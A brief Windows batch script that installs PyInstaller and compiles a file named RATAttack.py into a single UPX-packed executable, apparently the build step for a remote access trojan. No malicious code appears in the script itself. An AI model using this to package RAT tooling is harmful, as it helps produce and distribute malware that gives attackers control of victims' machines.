rem --specpath "%~dp0" --distpath "%~dp0\dist" --workpath "%~dp0\build" 
pip install pyinstaller
pyinstaller --clean --upx-dir "upx395w" --onefile "%~dp0/RATAttack.py"
